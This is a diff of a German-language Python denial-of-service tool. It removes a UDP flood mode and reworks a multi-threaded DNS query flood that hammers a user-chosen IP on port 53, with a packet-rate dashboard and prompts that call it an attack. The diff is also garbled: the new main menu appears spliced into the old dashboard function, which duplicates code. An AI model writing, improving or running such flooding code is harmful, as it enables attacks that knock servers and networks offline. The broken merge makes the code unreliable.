@@ -1,55 +1,53 @@
 import os
 import random
 import socket
+import sys
 import threading
 import time
-import sys
 
 # Globale Variablen
 packet_counter = 0
+counter_lock = threading.Lock()  # Verhindert Fehler beim gleichzeitigen Zählen
 stop_event = threading.Event()
+
 
 # Banner
 def show_banner(color):
     os.system("clear")
     print(f"{color}")
-    print("""
+    print(
+        """
 ██████╗ ██████╗  
 ██╔══██╗██╔══██╗
-██████╔╝██████╔
+██████╔╝██████╔╝
 ██╔═══╝ ██╔═══╝ 
 ██║     ██║     
 ╚═╝     ╚═╝      
-    """)
+    """
+    )
     print("\033[0m")
 
-# UDP Flood
-def udp_flood(ip, port, packet_size, packet_rate):
-    global packet_counter
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)  # Empfangsbuffer minimieren
-    udp_bytes = random._urandom(packet_size)
-    start_time = time.time()
-
-    while not stop_event.is_set():
-        try:
-            sock.sendto(udp_bytes, (ip, port))
-            packet_counter += 1
-
-            # Paketrate begrenzen
-            if packet_counter / (time.time() - start_time) > packet_rate:
-                time.sleep(0.001)  # Kurz pausieren, um die Rate einzuhalten
-        except:
-            pass
 
 # DNS Query Flood verstärken
 def dns_flood(ip):
-    server = (ip, 53)  # Port 53 für DNS
+    global packet_counter
+    server = (ip, 53)  # Port 53 für DNS ist Standard
     query = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
+
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-    while True:
-        sock.sendto(query, server)
+    # Schleife stoppt, wenn ENTER gedrückt wird
+    while not stop_event.is_set():
+        try:
+            sock.sendto(query, server)
+            # Sicherer Zähler für Multithreading
+            with counter_lock:
+                packet_counter += 1
+        except socket.error:
+            time.sleep(0.1)  # Kleine Pause bei Netzwerkstress
+
+    sock.close()
+
 
 # Menü zur Farbauswahl
 def choose_color():
@@ -65,9 +63,64 @@ def choose_color():
         "4": "\033[0m",
     }.get(choice, "\033[0m")
 
+
 # Live-Dashboard
 def dashboard():
     global packet_counter
+    start_time = time.time()
+    while not stop_event.is_set():
+        elapsed = time.time() - start_time
+        rate = packet_counter / elapsed if elapsed > 0 else 0
+        print(
+            f"\r[INFO] Gesendete Pakete: {packet_counter} | Paketrate: {rate:.2f}/s",
+            end="",
+        )
+        time.sleep(1)
+    print("\n[INFO] Dashboard gestoppt.")
+
+
+# Hauptprogramm
+if __name__ == "__main__":
+    color = choose_color()
+    show_banner(color)
+
+    while True:
+        print("1 - DNS QUERY")
+        print("2 - Beenden")
+        choice = input(" [ Wähle eine Option ] : ")
+
+        if choice == "2":
+            print("[INFO] Programm beendet.")
+            sys.exit()
+
+        if choice == "1":  # DNS QUERY
+            ip = input("Ziel-IP-Adresse: ")
+            threads_count = int(input("Anzahl der Threads: "))
+
+            # Zähler für einen neuen Durchgang zurücksetzen
+            packet_counter = 0
+            stop_event.clear()
+
+            # Threads starten (Nur 'ip' übergeben, da Port 53 fest ist)
+            attack_threads = [
+                threading.Thread(target=dns_flood, args=(ip,))
+                for _ in range(threads_count)
+            ]
+            for thread in attack_threads:
+                thread.start()
+
+            # Dashboard starten
+            dashboard_thread = threading.Thread(target=dashboard)
+            dashboard_thread.start()
+
+            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
+            stop_event.set()
+
+            # Warten, bis alle Threads sauber beendet sind
+            for thread in attack_threads:
+                thread.join()
+            dashboard_thread.join()
+            print("[INFO] Alle Threads erfolgreich beendet.\n")
     start_time = time.time()
     while not stop_event.is_set():
         elapsed = time.time() - start_time
@@ -81,41 +134,15 @@ if __name__ == "__main__":
     show_banner(color)
 
     while True:
-        print("1 - UDP Flood")
-        print("2 - DNS QUERY")
-        print("3 - Beenden")
+        print("1 - DNS QUERY")
+        print("2 - Beenden")
         choice = input(" [ Wähle eine Option ] : ")
 
-        if choice == "3":
+        if choice == "2":
             print("[INFO] Programm beendet.")
             sys.exit()
 
-        if choice == "1":  # UDP Flood
-            ip = input("Ziel-IP-Adresse: ")
-            port = int(input("Ziel-Port: "))
-            duration = int(input("Dauer des Angriffs (Sekunden): "))
-            threads = int(input("Anzahl der Threads: "))
-            packet_size = max(1, min(65507, int(input("Paketgröße (Bytes, 1-65507): "))))
-            packet_rate = max(1, int(input("Maximale Pakete pro Sekunde (min. 1): ")))
-
-            stop_event.clear()
-
-            # Threads starten
-            attack_threads = [
-                threading.Thread(target=udp_flood, args=(ip, port, packet_size, packet_rate))
-                for _ in range(threads)
-            ]
-            for thread in attack_threads:
-                thread.start()
-
-            # Dashboard starten
-            dashboard_thread = threading.Thread(target=dashboard)
-            dashboard_thread.start()
-
-            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
-            stop_event.set()
-
-        elif choice == "2":  # DNS QUERY
+        if choice == "1": # DNS QUERY
             ip = input("Ziel-IP-Adresse: ")
             port = int(input("Ziel-Port: "))
             threads = int(input("Anzahl der Threads: "))
